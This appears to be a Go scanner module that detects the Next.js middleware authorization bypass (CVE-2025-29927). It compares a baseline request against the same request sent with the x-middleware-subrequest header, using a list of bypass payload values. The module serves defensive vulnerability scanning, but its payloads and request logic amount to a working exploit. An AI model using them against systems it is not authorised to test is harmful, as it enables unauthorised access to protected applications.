package scan

import (
	"context"
	"fmt"
	"net/http"
	"strings"
)

// CVE-2025-29927 — Next.js middleware authorization bypass. Sending the
// internal `x-middleware-subrequest` header makes Next.js skip middleware
// execution, so any auth enforced in middleware is bypassed. We confirm it by
// comparing two responses for the same path: a baseline where middleware gates
// access (redirect to login / 401 / 403) versus the same request carrying the
// header, which returns 200 when the gate is skipped. The signal is the
// *difference* between the two responses — a single nuclei matcher, which sees
// one response, cannot express it. Hence the module engine.

// Known header values across affected major versions. Newer releases compare
// against a recursion-depth-limited chain, so the repeated forms are included.
var nextjsBypassPayloads = []string{
	"middleware",
	"src/middleware",
	"pages/_middleware",
	"middleware:middleware:middleware:middleware:middleware",
	"src/middleware:src/middleware:src/middleware:src/middleware:src/middleware",
}

// nextjsProbePath is the path probed for middleware gating. Root is the most
// common location for a middleware redirect-to-login on protected apps.
const nextjsProbePath = "/"

func init() {
	RegisterModule("modules/nextjs_middleware_bypass", ModuleFunc(runNextjsMiddlewareBypass))
}

func runNextjsMiddlewareBypass(ctx context.Context, env ModuleEnv) (Finding, bool) {
	url := strings.TrimRight(env.Base, "/") + nextjsProbePath

	baseStatus, ok := nextjsStatus(ctx, env.HC, url, "")
	if !ok || !nextjsProtected(baseStatus) {
		// No reachable middleware gate to bypass; nothing to confirm.
		return Finding{}, false
	}

	for _, payload := range nextjsBypassPayloads {
		bypassStatus, ok := nextjsStatus(ctx, env.HC, url, payload)
		if !ok || bypassStatus != http.StatusOK {
			continue
		}
		key := "middleware-bypass:" + payload
		return Finding{
			DetectionID: env.Det.ID,
			AssetID:     env.AssetID,
			Severity:    env.Det.Severity,
			Fingerprint: Fingerprint(env.AssetID, env.Det.ID, key),
			Request:     fmt.Sprintf("GET %s (x-middleware-subrequest: %s)", nextjsProbePath, payload),
			Note:        fmt.Sprintf("middleware gate (HTTP %d) bypassed to HTTP 200 via x-middleware-subrequest", baseStatus),
		}, true
	}
	return Finding{}, false
}

// nextjsProtected reports whether a baseline status indicates middleware is
// actively gating the path (so a bypass to 200 is meaningful).
func nextjsProtected(status int) bool {
	switch status {
	case http.StatusUnauthorized, http.StatusForbidden,
		http.StatusMovedPermanently, http.StatusFound,
		http.StatusTemporaryRedirect, http.StatusPermanentRedirect:
		return true
	}
	return false
}

// nextjsStatus issues one GET and returns its status without following
// redirects — a 307 to /login must read as 307, not the login page's 200.
// subreq, when set, is sent as the x-middleware-subrequest header.
func nextjsStatus(ctx context.Context, shared *http.Client, url, subreq string) (int, bool) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	if err != nil {
		return 0, false
	}
	if subreq != "" {
		req.Header.Set("x-middleware-subrequest", subreq)
	}
	// Reuse the scanner's timeout and transport but stop at the first response.
	c := &http.Client{
		Timeout:       shared.Timeout,
		Transport:     shared.Transport,
		CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse },
	}
	resp, err := c.Do(req)
	if err != nil {
		return 0, false
	}
	resp.Body.Close()
	return resp.StatusCode, true
}
